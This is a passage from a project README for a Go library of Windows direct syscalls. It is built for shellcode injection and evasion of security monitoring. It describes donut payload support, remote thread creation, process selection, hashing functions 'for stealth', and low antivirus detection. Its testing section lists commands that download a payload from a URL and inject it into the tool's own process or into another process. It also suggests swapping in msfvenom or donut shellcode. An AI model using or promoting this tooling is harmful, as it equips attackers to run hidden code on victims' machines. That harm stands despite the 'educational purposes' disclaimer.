- **Reduced Accidents**: Less chance of accidentally targeting system processes

#### **Process Filter List**
The system automatically hides these common Windows processes:
```
system, smss.exe, csrss.exe, wininit.exe, winlogon.exe, services.exe, 
lsass.exe, svchost.exe, dwm.exe, explorer.exe, fontdrvhost.exe, 
sihost.exe, taskhostw.exe, conhost.exe, dllhost.exe, and 15+ more
```

### Thread Management Improvements

#### **Donut Payload Compatibility**
- **Thread Waiting**: Added `NtWaitForSingleObject` to wait for payload completion
- **Handle Cleanup**: Proper thread handle closure after execution
- **Indefinite Wait**: Uses `nil` timeout for complete payload execution
- **Status Reporting**: Detailed logging of thread execution status

#### **Usage Pattern**
```go
// Thread now waits for completion (essential for donut payloads)
status, err := winapi.NtCreateThreadEx(/* args */)
if status == winapi.STATUS_SUCCESS {
    // Wait for thread to complete
    waitStatus, err := winapi.NtWaitForSingleObject(hThread, false, nil)
    // Handle cleanup
    winapi.NtClose(hThread)
}
```

### Validation & Error Handling

#### **Comprehensive NT Status Integration**
- **Smart Validation Thresholds**: Only warns for truly suspicious syscall numbers (0-1)
- **Contextual Warnings**: Differentiates between normal low numbers and actual issues
- **False Positive Reduction**: No more warnings for common functions like `NtClose(15)`

#### **Expected Behavior**
```
NtClose: SSN 15           - Normal, no warning
NtWaitForSingleObject: SSN 4  - Normal, no warning  
NtReadFile: SSN 6         - Normal, no warning
Unknown Function: SSN 0   - Warning (truly suspicious)
```

## Security Considerations

- **Kernel-level Detection**: Direct syscalls may still be monitored at the kernel level
- **Process Protection**: Some protected processes resist manipulation
- **NTSTATUS Handling**: Always check return codes for error conditions
- **Memory Safety**: Use appropriate memory protection and bounds checking

## Examples

See the cmd/main.go file for an example 

- **Basic Memory Operations**: Allocation, reading, writing
- **Process Manipulation**: Opening processes, thread creation
- **File Operations**: Creating, reading, writing files
- **System Queries**: Getting system and process information
- **Obfuscation**: Using function hashes for stealth

## Testing

```bash
cd go-direct-syscalls

bash build.sh

# Dump all syscalls (no injection, safe for analysis)
./cmd.exe -dump

# Self-injection with embedded calc shellcode (default for -example)
./cmd.exe -example 

# Explicit self-injection mode
./cmd.exe -self -url http://example.com/payload.bin

# Remote injection with custom payload (shows process selection)
./cmd.exe -url http://example.com/payload.bin

# The embedded shellcode is a simple calc.exe payload - replace GetEmbeddedShellcode() 
# function with your own shellcode generated via donut, msfvenom, etc.
```
## Detection

![Screen Shot 2025-06-06 at 5 21 45 PM](https://github.com/user-attachments/assets/8fa911db-129c-4d11-a0dd-d08fa3fd143a)
![image](https://github.com/user-attachments/assets/0050c8d0-4980-46dd-bbc9-626320418c1a)
(as of right now - Friday June 6th 5:21 pm ET 2025)

## Contributing

Contributions are welcome! Please feel free to:

- Add more Windows API function wrappers
- Improve error handling
- Add more comprehensive examples
- Optimize performance
- Add support for additional architectures

## License

This project is licensed under the [MIT LICENSE](LICENSE).

## Credits

- **Original Concept**: Extracted from [Whitecat18's Rust implementation](https://github.com/Whitecat18/Rust-for-Malware-Development/tree/main/syscalls/direct_syscalls)
- **Assembly Implementation**: Based on [janoglezcampos/rust_syscalls](https://github.com/janoglezcampos/rust_syscalls)

##  Disclaimer
I am a college student with limited systems programming experience, this tool may not work as expected for all types of payloads or in all circumstances, if you run into an issue please submit it to me on this repo or send a DM on twitter or something I would really
appreciate it. :3 thanks
ALSO 
This tool is provided for **educational and research purposes only**. Use of this software for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable laws. The developers assume no liability and are not responsible for any misuse or damage caused by this program.
